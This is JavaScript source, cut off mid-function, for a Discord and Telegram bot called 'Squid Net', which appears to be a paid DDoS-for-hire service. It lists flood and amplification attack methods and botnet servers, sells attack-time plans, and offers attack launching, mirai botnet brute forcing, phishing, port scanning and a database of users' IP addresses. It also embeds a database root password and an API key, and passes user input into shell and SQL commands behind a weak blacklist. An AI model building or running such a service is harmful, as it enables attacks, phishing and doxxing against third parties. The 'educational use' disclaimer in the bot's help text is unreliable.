var servers = ['773239626700947466', '773216551049625651', '760649611702042664', '762154825210658856', '755189745654562926', '765589235251806279', '768038856834154507', '765949734658807424', '750549382113394810', '697813113826705449', '751803311925100586', '714553268516421663', '753265376179257395', '731966897179983974', '742500082745868339', '739431969653522533', '752890407091830928', '577102236685959168', '746265021251584020', '730145718353920100', '737799633677451336', '743440854932389908', '742564644291346433', '710949389660848198', '691117681629200390', '729680316041527318', '728748595112575046', '733520156298575936', '727809906304090153', '597136164180328448', '726139035038384149', '755189745654562926', '757809378119254137', '751582683557003275', '758771650492629063', '760215138572697612', '760330663441858580', '761073684097400832', '760649611702042664', '760649611702042664'] //Authorised Servers
var methods = ["squid", "udp", "ovh", "vse","syn","ack","stdhex","udpplain"]; //All available methods
var godmethods = ["udp","vse","ack","udpgame","ovh","stdhex","std","stomp","greeth","greip","mine","tcpall","frag","synhome","syn","tcphex","vsehex","udpbypass","ovhudp","xmas"]; //All available methods
var spongemethods = ["hex", "udprape", "ovhtcp", "ovh", "rand", "wizzard", "ovhgame", "ovhex", "killallv2", "rail", "vsev3", "fnlag", "nfokiller", "vmt", "anmp", "ssdp", "ntp", "dns", "mdns", "extorsion", "crus", "rawudp", "visa", "zap", "homefuck", "kill", "evo", "silo", "quake", "odin", "memecached", "mssql", "fivem", "cldap", "ard", "stun", "xdoshttp", "xdosudp", "vsev2"] // Sponge Methods
var backup1methods = ["udp", "stdhex", "udpgame", "vse", "synhome", "syn", "frag", "tcpall", "xmas", "stomp", "greip", "greeth", "tcphex", "vsehex", "udpbypass", "ovh", "ovhudp"]
var ddosenabledservers = ["762154825210658856", "765713558653894658"]
var availableservers = ['kraken', 'backup1'] // Botnet servers
var powerOverride = ["772878305388265492", "760994414704853012"]
const TelegramBot = require('node-telegram-bot-api');
var exec = require('child_process').exec;
const config = require('./config.json');
const Discord = require('discord.js');
var firstline = require("firstline");
const client = new Discord.Client({
  restRequestTimeout: 6000000
});
const checkIp = require('check-ip');
const replace = require('replace');
const mysql = require("mysql");
const split = require('split');
const ping = require('ping');
const prefix = config.prefix;
const opn = require('opn');
const sys = require('sys');
const fs = require('fs');
var Exp2M = '5184000000';
var ExpM = '2592000000';
var ExpR = '2592000000';
var ExpW = '604800000';
var ExpT = '86400000';
var expiry = "NULL";
var basePlan = 0;
var no = "add";
var tuser = "";
var user = "";
var d = "00";
var h = "00";
var m = "00";
var s = "00";
var planID;
var child;
var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "fuckingpeopleover",
  timeout: 6000000,
  database: "bot"
});
con.on('close', function(err) {
  if (err) {
    console.log("SQL Connection Closed");

    // We did not expect this connection to terminate
    // connection = mysql.createConnection(connection.config);
  } else {
    // We expected this to happen, end() was called.
    console.log('Manually called .end()');
  }
});
const talkedRecently = new Set();
var cooled = false;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}
var bot = new TelegramBot(config.ttoken, {
  polling: true
});
client.once('ready', () => {
  console.log('Connection Established!');
  client.user.setActivity(":) | Prefix: /", {
    type: "PLAYING"
  })
});
con.connect(function(err) {
  if (err) throw err;
  //console.log("Connected to Database!");
});

function test(commanda1, runningBot, other, ida, idb, guildID) {
  var con = mysql.createConnection({
    host: "localhost",
    user: "root",
    password: "fuckingpeopleover",
    timeout: 6000000,
    database: "bot"
  }); // MYSQL Connection
  var chatId = idb;
  var message = other
  var msg = other;
  var user = ida.toString();
  var messageTime = Date.now(); //Get time for auto expiry
  let {
    guild
  } = message;
  if (!guild) {
    var guildID = "DM"
  } else {
    var guildID = message.guild.id
  }
  if (runningBot == "Discord") {
    var args = message.content.toLowerCase().split(/ +/g);
    if (runningBot == "Discord") {
      var args = message.content.slice(prefix.length).trim().split(/ +/g); // Remove prefix from command
    } else if (runningBot == "Telegram") {
      var args = msg.text.slice(prefix.length).trim().split(/ +/g);
    }
    var response = args.join(' ');
  } else if (runningBot == "Telegram") {
    con.query(`SELECT * FROM user WHERE tid = ${user}`, (err, rows) => {
      if (err) throw err;
      if (rows.length < 1) {
        var [cmd1, token] = args.toString().toLowerCase().split(",");
        if (cmd1 == "link") {
          if (token == null) {
            return;
          }
          var token2 = token.replace("rm", "")
          var token = token2.replace(">", "")
          var token2 = token.replace("<", "")
          var token = token2.replace("\\", "")
          var token2 = token.replace("&", "")
          var token = token2.replace("|", "")
          var token2 = token.replace(";", "")
          var token = token2.replace(";", "")
          var token2 = token.replace("add", "")
          var token = token2.replace("remove", "")
          var token2 = token.replace("-", "")
          var token = token2.replace("$", "")
          var token2 = token.replace("-", "")
          var token = token2.replace("(", "")
          var token2 = token.replace(")", "")
          var token = token2.replace("`", "")
          var token2 = token.replace("-", "")
          var token = token2.replace("*", "")
          if (token == "0") {
            bot.sendMessage(chatId, `You havent initated the proccess! Do /link in the discord!`);
            return;
          }
          con.query(`SELECT * FROM user WHERE token = "${token}"`, (err, rows) => {
            if (err) throw err;
            if (rows.length < 1) {
              bot.sendMessage(chatId, `Invalid Token`);
              return;
            } else {
              con.query(`UPDATE user SET tid = '${user}' WHERE token = '${token}'`)
              bot.sendMessage(chatId, `Succesfully Linked Accounts!`);
            }
          });
        } else {
          bot.sendMessage(chatId, `You need to setup ur account in Discord!\nDo /link in the discord to start the proccess!\nOnce you have gotten your token return here and do /link {TOKEN}`);
        }
        return;
      }
    });
    var args = msg.text.slice(prefix.length).trim().split(/ +/g);
    if (runningBot == "Discord") {
      var args = message.content.slice(prefix.length).trim().split(/ +/g); // Remove prefix from command
    } else if (runningBot == "Telegram") {
      var args = msg.text.slice(prefix.length).trim().split(/ +/g);
    }
    var response = args.join(' ');
  }
  var messageTime = Date.now(); //Get time for auto expiry
  con.query(`SELECT * FROM user WHERE id="${user}" or tid="${user}"`, (err, rows) => {
    if (err) throw err;
    var bot = new TelegramBot(config.ttoken, {
      polling: false
    });
    var fancyDate = new Date(new Date().toUTCString());
    var response = args.join(' ');
    rows.forEach((row) => {
      var user = row.id
      var contents = row.expiry
      var contents2 = row.spongeExpiry
      var con = mysql.createConnection({
        host: "localhost",
        user: "root",
        password: "fuckingpeopleover",
        timeout: 6000000,
        database: "bot"
      }); // MYSQL Connection
      if (parseInt(contents) < parseInt(messageTime)) {
        con.query(`UPDATE user SET expiry = '000000' WHERE id = '${row.id}'`)
        con.query(`UPDATE user SET plan = '0' WHERE id = '${row.id}'`)
        con.query(`UPDATE user SET spongeAddOn = '0' WHERE id = '${row.id}'`)
      }
      if (parseInt(contents2) < parseInt(messageTime)) {
        con.query(`UPDATE user SET spongeExpiry = '000000' WHERE id = '${row.id}'`)
        con.query(`UPDATE user SET spongeAddOn = '0' WHERE id = '${row.id}'`)
      }
      if (row.plan === "1") {
        var plan = "Copper Squid";
        var maxHitLimit = 120
        var maxLagLimit = 0;
        var maxAtkCount = 0;
        var spongeHitLimit = 0;
      } else if (row.plan === "2") {
        var plan = "Aluminum  Squid";
        var maxHitLimit = 600
        var maxLagLimit = 0;
        var maxAtkCount = 0;
        var spongeHitLimit = 0;
      } else if (row.plan === "3") {
        var plan = "Silver Squid";
        var maxHitLimit = 1200
        var maxLagLimit = 0;
        var maxAtkCount = 0;
        var spongeHitLimit = 0;
      } else if (row.plan === "4") {
        var plan = "Elite";
        var maxLagLimit = 120
        var maxAtkCount = 80
        var maxHitLimit = 3600
        var spongeHitLimit = 0;
      } else if (row.plan === "5") {
        var plan = "TR4P$QU1D";
        var maxLagLimit = 86400
        var maxAtkCount = 999999999999999
        var maxHitLimit = 86400
        var spongeHitLimit = 120;
      } else if (row.plan === "6") {
        var plan = "Platinum Squid";
        var maxLagLimit = 120
        var maxAtkCount = 80
        var maxHitLimit = 4400
        var spongeHitLimit = 0;
      } else if (row.plan === "7") {
        var plan = "Gold Squid";
        var maxHitLimit = 1800
        var maxLagLimit = 0;
        var maxAtkCount = 0;
        var spongeHitLimit = 0;
      } else if (row.plan === "8") {
        var plan = "Emerald Squid";
        var maxLagLimit = 120
        var maxAtkCount = 80
        var maxHitLimit = 3600
        var spongeHitLimit = 0;
      } else if (row.plan === "9") {
        var plan = "Diamond Squid";
        var maxLagLimit = 120
        var maxAtkCount = 80
        var maxHitLimit = 7200
        var spongeHitLimit = 0;
      } else if (row.plan === "69") {
        var plan = "GodMode";
        var maxLagLimit = 86400
        var maxAtkCount = 999999999999999
        var maxHitLimit = 86400
        var spongeHitLimit = 86400;
      } else if (row.plan === "99") {
        var plan = "Bitch";
        var maxLagLimit = 120;
        var maxAtkCount = 120;
        var maxHitLimit = 120;
        var spongeHitLimit = 120;
      } else {
        var plan = "No Plan";
        var maxLagLimit = 0;
        var maxAtkCount = 0;
        var maxHitLimit = 15;
        var spongeHitLimit = 0;
      };
      if (row.spongeAddOn === "1") {
        var planAddonSponge = "Patrick";
        var spongeHitLimit = 300;
      } else if (row.spongeAddOn === "2") {
        var planAddonSponge = "SpongeBob";
        var spongeHitLimit = 600;
      } else if (row.spongeAddOn === "3") {
        var planAddonSponge = "Squidward";
        var spongeHitLimit = 900;
      } else {
        var planAddonSponge = "None";
      }

      function expiryFormat(expr123) {
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "bot"
        });
        con.query(`SELECT * FROM user WHERE id = "${expr123}" or tid = "${expr123}"`, (err, rows) => {
          if (err) throw err;
          rows.forEach((row) => {
            if (parseInt(row.expiry) < messageTime) {
              //sql = `UPDATE user SET plan = '0' WHERE id = '${expr123}'`;
              //con.query(sql)
            } else {
              var contents = parseInt(row.expiry) - messageTime;
            }
            const parsed = parseInt(contents);
            if (isNaN(parsed)) {
              var h = 00
              var m = 00
              var s = 00
              var d = 00
            } else {
              var h = Math.floor(parseFloat(`${contents}`) / 1000 / 60 / 60);
              var m = Math.floor((parseFloat(`${contents}`) / 1000 / 60 / 60 - h) * 60);
              var s = Math.floor(((parseFloat(`${contents}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {
                var d = 0
              } else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
            }
          })
        });
      }
      expiryFormat(user)

      function cooldown() {}
      let {
        guild
      } = message;

      function commandNotFound() {
        if (runningBot == "Discord") {
          if (!ddosenabledservers.includes(`${guildID}`)) {
            var string = "**This is for testing your own systems only. We do not indorse attacking any private companies or people our bot is for private use/ educational use only!**\n\n**/tr4p** - This is the base command\n**/info** - Shows the information of the current bot\n**/accounts** - Everything Account Related\n**/planmenu** - Everything related to plans\n**/ipmenu** - Everything related to getting information from an IP\n**/  funmenu** - It's in the name!\n**/creditsmenu** - Real Casino!\n**/dbmenu** - IP Database/Resolver\n**/mail** Free Email Service\n**/malware** - Malware Scanner"
          } else {
            var string = "**This is for testing your own systems only. We do not indorse attacking any private companies or people our bot is for private use/ educational use only!**\n\n**/tr4p** - This is the base command\n**/info** - Shows the information of the current bot\n**/accounts** - Everything Account Related\n**/attackmenu** - Everything related to launching attacks.\n**/planmenu** - Everything related to plans\n**/ipmenu** - Everything related to getting information from an IP\n**/  funmenu** - It's in the name!\n**/creditsmenu** - Real Casino!\n**/dbmenu** - IP Database/Resolver\n**/mail** Free Email Service\n**/malware** - Malware Scanner"
          }
        } else {
          var string = "**This is for testing your own systems only. We do not indorse attacking any private companies or people our bot is for private use/ educational use only!**\n\n**/tr4p** - This is the base command\n**/info** - Shows the information of the current bot\n**/accounts** - Everything Account Related\n**/attackmenu** - Everything related to launching attacks.\n**/planmenu** - Everything related to plans\n**/ipmenu** - Everything related to getting information from an IP\n**/  funmenu** - It's in the name!\n**/creditsmenu** - Real Casino!\n**/dbmenu** - IP Database/Resolver\n**/mail** Free Email Service\n**/malware** - Malware Scanner"
        }
        var embed = new Discord.MessageEmbed()
          .setTitle("Help Menu")
          .setAuthor("Squid Net - TR4P$QU1D")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
      }

      function makeid(length) {
        var result = '';
        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
          result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
      }

      function planKeys(plan3, amount) {
        if (plan3 === "1" || plan3.includes("copper")) {
          var discrim = "1"
          var price = 50000
        } else if (plan3 === "2" || plan3.includes("aluminum") || plan3.includes("aluminium")) {
          var discrim = "2"
          var price = 275000
        } else if (plan3 === "3" || plan3.includes("silver")) {
          var discrim = "3"
          var price = 900000
        } else if (plan3 === "4" || plan3.includes("elite")) {
          var discrim = "4"
          var price = 9999999999999999999
        } else if (plan3 === "5" || plan3.includes("test")) {
          var discrim = "5"
          var price = 99999999999999999999
        } else if (plan3 === "6" || plan3.includes("platinum")) {
          var discrim = "6"
          var price = 26800000
        } else if (plan3 === "7" || plan3.includes("gold")) {
          var discrim = "7"
          var price = 2450000
        } else if (plan3 === "8" || plan3.includes("emerald")) {
          var discrim = "8"
          var price = 7800000
        } else if (plan3 === "9" || plan3.includes("diamond")) {
          var discrim = "9"
          var price = 92000000
        } else if (plan3 === "69" || plan3.includes("godmode")) {
          var discrim = "69"
          var price = 999999999999999999999
        } else {
          if (runningBot == "Discord") {
            message.channel.send("Thats not a plan?")
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `Thats not a plan?`);
          }
          return;
        }
        i = 0;
        while (i < parseInt(amount)) {
          if (!parseInt(row.admin) == 1) {
            console.log(parseInt(price), parseInt(row.credits))
            console.log(parseInt(price) > parseInt(row.credits))
            if (parseInt(price) > parseInt(row.credits)) {
              if (runningBot == "Discord") {
                message.channel.send("Not enough credits.")
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `Not enough credits.`);
              }
              return;
            }
          }
          var key = discrim + makeid(48)
          var execSync = require('child_process').execSync;
          var output = execSync(`echo "${key}" >> keys.txt`, {
            encoding: 'utf-8'
          });
          if (!parseInt(row.admin) == 1) {
            /*con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
              if (err) throw err;
              rows.forEach((row) => {
                var newCreditBalance = row.credits - price
                sql = `UPDATE user SET credits ="${newCreditBalance}" WHERE id ="${user}"`;
                con.query(sql)
                message.channel.send("I've sent you your key via DMs");
                message.author.send(key)
              })
            });*/
          } else {
            if (runningBot == "Discord") {
              message.channel.send(key)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${key}`);
            }
          }
          i++;
        }
      }
      if (runningBot == "Discord") {
        var args = message.content.slice(prefix.length).trim().split(/ +/g); // Remove prefix from command
        var args2 = args.shift();
      } else if (runningBot == "Telegram") {
        var args = msg.text.slice(prefix.length).trim().split(/ +/g);
        var args2 = args.shift();
      }
      var response = args.join(' ');
      var regex = /(rm)|>|<|&|\||(add)|(remove)|(193.228.91.12)|-|\$|\(|\)|\`|\*|;|\%|;/gi;
      for (let i = 0; i < args.length; i++) {
        if (args[i].match(regex)) {
          console.log('found blacklisted item: ' + args[i]);
          if (runningBot == "Discord") {
            var args = message.content.toLowerCase().split(/ +/g);
            var args2 = args.shift();
          } else if (runningBot == "Telegram") {
            var args = msg.text.slice(prefix.length).trim().split(/ +/g);
            var args2 = args.shift();
          }
          var args1 = args.join();
          var args2 = args1.replace("rm", "")
          var args1 = args2.replace(">", "")
          var args2 = args1.replace("<", "")
          var args1 = args2.replace("@", "")
          var args2 = args1.replace("&", "")
          var args2 = args1.replace(";", "")
          var args2 = args1.replace(";", "")
          var args1 = args2.replace("|", "")
          var args2 = args1.replace("add", "")
          var args1 = args2.replace("remove", "")
          var args2 = args1.replace("-", "")
          var args1 = args2.replace("$", "")
          var args2 = args1.replace("-", "")
          var args1 = args2.replace("(", "")
          var args2 = args1.replace(")", "")
          var args1 = args2.replace("`", "")
          var args2 = args1.replace("-", "")
          var args1 = args2.replace("*", "")
          var args2 = args1.replace("%", "")
          var args1 = args2.replace("!", "")
          var args = args1.split(",");
        }
      }
      var illegal = "false"
      switch (commanda1) {
        case 'tr4p': {
          if (illegal === "true") {
            break;
          }
          console.log("b")
          commandNotFound();
          break;
        }
        case 'link': {
          var linkToken = makeid(16)
          con.query(`UPDATE user SET token = '${linkToken}' WHERE id = '${user}'`)
          var embed = new Discord.MessageEmbed()
            .setTitle("Link")
            .setAuthor("Squid Net - TR4P$QU1D")
            .setColor(0x089FEF)
            .setDescription(`In order to link your accounts you will need to save this token. [${linkToken}]\n\nKEEP THIS PRIVATE! Anyone who has this token can access your account.`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.author.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `Do this in discord.`);
          }
          break;
        }
        case 'mail': {
          if (illegal === "true") {
            break;
          }
          var string = `**/mailnew** - Gives you a new temp email\n**/mailinbox EMAIL** - View the inbox of that address\n**/mailread EMAIL ID** - Read the email\n`
          var embed = new Discord.MessageEmbed()
            .setTitle("Email Menu")
            .setAuthor("Squid Net - TR4P$QU1D")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'malware': {
          if (illegal === "true") {
            break;
          }
          var string = `**/scan URL** - Scans a file for malware (Can take a while)\n**/scanres ID** - Check the result of the scan`
          var embed = new Discord.MessageEmbed()
            .setTitle("Malware Menu")
            .setAuthor("Squid Net - TR4P$QU1D")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'scan': {
          if (illegal === "true") {
            break;
          }
          var response = args.join(' ');
          var execSync = require('child_process').execSync;
          const output = execSync(`bash scan.sh ${response}`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          const p = execSync(`cat .reskey`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          if (output.includes(`Your resource is queued for analysis`)) {
            message.channel.send(`New file found.\nWait a bit and do /scanres ${p}`)
            return;
          }
          if (!output.includes(`: 0`)) {
            message.channel.send("This file appears to be malicous")
            return;
          }
          if (output.includes(`: 0`)) {
            message.channel.send("This file appears to be safe")
            return;
          }
          var contents = output;
          if (contents.length > 1990) {
            var contents = contents.slice(contents.length - 1990)
          }
          message.channel.send(`\`\`\`yaml\n${contents}\`\`\``)
          break;
        }
        case 'scanres': {
          if (illegal === "true") {
            break;
          }
          var response = args.join(' ');
          var execSync = require('child_process').execSync;
          const output = execSync(`curl -q --request GET   --url "https://www.virustotal.com/vtapi/v2/file/report?apikey=2e00ecd67b896fc80d360a313abe1535571874b21854c4d25434ea8cc3d3b0bb&resource=${response}"`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          if (output.includes(`Your resource is queued for analysis`)) {
            message.channel.send(`Still scanning...`)
            return;
          }
          if (!output.includes(`: 0`)) {
            message.channel.send("This file appears to be malicous")
            return;
          }
          if (output.includes(`: 0`)) {
            message.channel.send("This file appears to be safe")
            return;
          }
          var contents = output;
          if (contents.length > 1990) {
            var contents = contents.slice(contents.length - 1990)
          }
          message.channel.send(`\`\`\`yaml\n${contents}\`\`\``)
          break;
        }
        case 'dbmenu': {
          if (illegal === "true") {
            break;
          }
          var string = `**/dbsearch USER** - Search the database for a user\n**/dbget USER** - Get a users IP if their in the database\n**/dbcount** - Get count of IPs in the database\n**/dbgive user:ip < THIS EXACT FORMAT** - Add a user to the database.\n **/dbsuggest user:ip < THIS EXACT FORMAT** - Suggest / Request an IP be added to the database`
          var embed = new Discord.MessageEmbed()
            .setTitle("Database Menu")
            .setAuthor("Squid Net - TR4P$QU1D")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'attackmenu': {
          if (illegal === "true") {
            break;
          }
          if (runningBot == "Discord") {
            console.log(guildID)
            if (guild) {
              if (!ddosenabledservers.includes(`${guildID}`)) {
                var string = " "
              } else {
                var string = `**/peen {server} {method} {ip} {length}** - Check /methods for available attacks\n**/methods** - Show all available methods\n**/serverinfo** - View information about available d d 0 s Servers\n**/checkservers** - See which servers are online\n**/lag** - lagswitch like attack. Fully Customizeable to automate attacks patterns\n**/lagstop** - Kills lag\n**/brute {IP}** - Brute mirai botnet`
              }
            }
            } else {
              var string = `**/peen {server} {method} {ip} {length}** - Check /methods for available attacks\n**/methods** - Show all available methods\n**/serverinfo** - View information about available d d 0 s Servers\n**/checkservers** - See which servers are online\n**/lag** - lagswitch like attack. Fully Customizeable to automate attacks patterns\n**/lagstop** - Kills lag\n**/brute {IP}** - Brute mirai botnet`
            }
          var embed = new Discord.MessageEmbed()
            .setTitle("Attack Menu")
            .setAuthor("Squid Net - TR4P$QU1D")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'ipmenu': {
          if (illegal === "true") {
            break;
          }
          var string = `**/ping {IP_ADDRESS}** - pings an ip duh\n**/tcpping {IP} {PORT}** - TCP PING\n**/nmap {IP_ADDRESS} {PORT}** - google how to use it. //Port is optional\n**/nmapsv {IP_ADDRESS} {PORT}** - VERY Deep OS and version scan //Port is optional\n**/checkip {IP_ADDRESS}** - Check an ip using several apis\n**/urlhaus {SEARCH}** - Search URLHAUS for a string!`
          var embed = new Discord.MessageEmbed()
            .setTitle("IP Menu")
            .setAuthor("Squid Net - TR4P$QU1D")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'accounts': {
          if (illegal === "true") {
            break;
          }
          var string = `**These are free please dont complain about them**\n**/vpn**\n**/hulu**\n**/steamcode**\n**/xboxcode**\n**/mega** - Mega.nz\n\n**Phishing**\n\n**/phish SITE** - Phishing tool do /phishoptions`
          var embed = new Discord.MessageEmbed()
            .setTitle("Accounts:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'planmenu': {
          if (illegal === "true") {
            break;
          }
          var string = `**/plan** Shows your current plan information\n**/logplan** Shows your current logger plan information\n**/getplan @user** - Shows a users plan information\n**/plans** - Shows you available plans and prices\n**/bugbounty** - Free plans (seriously)\n**/claim <KEY>** - Claim a plan key <3`
          var embed = new Discord.MessageEmbed()
            .setTitle("Plan Menu:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'logmenu': {
          if (illegal === "true") {
            break;
          }
          var string = "Want to listen to one server only? add the name of that server onto the end /listen (/listen vps1)\n\n Servers:\n**vps1**: Ping Logger\n**cyberhub**\n**nordvpn**\n**octosniff**\n**nfoservers**\n**stressthem**\n**nitro**\n**instagram**"
          var embed = new Discord.MessageEmbed()
            .setTitle("Logger Menu:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'creditsmenu': {
          if (illegal === "true") {
            break;
          }
          var string = `**/credits** - View your credits\n**/creditsbuy** - Buy something nice with your credits\n**/creditsplay** - Turn your measly 50 credits into 50 Million Credits!`
          var embed = new Discord.MessageEmbed()
            .setTitle("Credits Menu:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        case 'credits': {
          if (illegal === "true") {
            break;
          }
          var string = `Please Complete the Security Captcha to Use This! /captcha`
          if (parseInt(row.verified) == 0) {
            var embed = new Discord.MessageEmbed()
              .setTitle("Captcha v0.2:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var string = `Credits: ${row.credits}`
              var embed = new Discord.MessageEmbed()
                .setTitle("Your Credits:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
            })
          });
          con.query(`SELECT * FROM poker WHERE id = ${user}`, (err, rows) => {
            if (err) throw err;
            let sql;
            if (rows.length < 1) {
              sql = `INSERT INTO poker (id, isWaiting) VALUES (${user}, "0")`;
              con.query(sql)
            }
          });
          con.query(`SELECT * FROM blackjack WHERE id = ${user}`, (err, rows) => {
            if (err) throw err;
            let sql;
            if (rows.length < 1) {
              sql = `INSERT INTO blackjack (id, gameState) VALUES (${user}, "0")`;
              con.query(sql)
            }
          });
          break;
        }
        case 'workaa11': {
          if (illegal === "true") {
            break;
          }
          var string = `Please Complete the Security Captcha to Use This! /captcha`
          if (parseInt(row.verified) == 0) {
            var embed = new Discord.MessageEmbed()
              .setTitle("Captcha v0.2:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var sql;
          con.query(`SELECT * FROM jobs WHERE id = "${user}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var receive = Math.floor(Math.random() * row.amount) + 1
              var string = `You worked as a **${row.job}** and got paid **${receive}**!`
              var embed = new Discord.MessageEmbed()
                .setTitle("You worked!:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              con.query(`SELECT * FROM user WHERE id = "${user}"`, (err, rows) => {
                if (err) throw err;
                rows.forEach((row) => {
                  console.log("Titties:", receive)
                  var newCredits = parseInt(row.credits) + parseInt(receive);
                  console.log(newCredits)
                  sql = `UPDATE user SET credits = "${newCredits}" WHERE id = "${id}"`
                })
              });
            })
          });
          con.query(sql)
          break;
        }
        case 'creditsset': {
          if (parseInt(row.admin) == 1) {
            var expiry = null;
            var tag = message.author.tag;
            let user = []
            var plan1 = 0;
            var [usid1, plan1] = args.toString().split(",");
            var a = usid1.replace("<", "")
            var b = a.replace(">", "")
            var c = b.replace("@", "")
            var usid1 = c.replace("!", "")
            sql = `UPDATE user SET credits ="${plan1}" WHERE id ="${usid1}"`;
            con.query(sql)
            var string = `User ID: **${usid1}**\nCredits: **${plan1}**`
            var embed = new Discord.MessageEmbed()
              .setTitle("Credits Set:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          } else {
            break;
          }
          break;
        };
      case 'creditsresetall': {
        if (parseInt(row.admin) == 1) {
          var expiry = null;
          var tag = message.author.tag;
          let user = []
          var plan1 = 0;
          var [usid1, plan1] = args.toString().split(",");
          var a = usid1.replace("<", "")
          var b = a.replace(">", "")
          var c = b.replace("@", "")
          var usid1 = c.replace("!", "")
          sql = `UPDATE user SET credits ="${plan1}" WHERE id ="${usid1}"`;
          con.query(sql)
          var string = `User ID: **${usid1}**Credits: **${plan1}**`
          var embed = new Discord.MessageEmbed()
            .setTitle("Credits Set:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        } else {
          break;
        }
        break;
      };
      case 'creditsbuy': {
        if (!parseInt(row.admin) == 1) {
          message.channel.send("This is still in beta Contact an admin to exchange!")
          break;
        }
        var [pur, plan3, amount] = args.toString().toLowerCase().split(",");
        if (parseInt(row.verified) == 0) {
          var string = `Please Complete the Security Captcha to Use This! /captcha`
          var embed = new Discord.MessageEmbed()
            .setTitle("Captcha v0.2:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
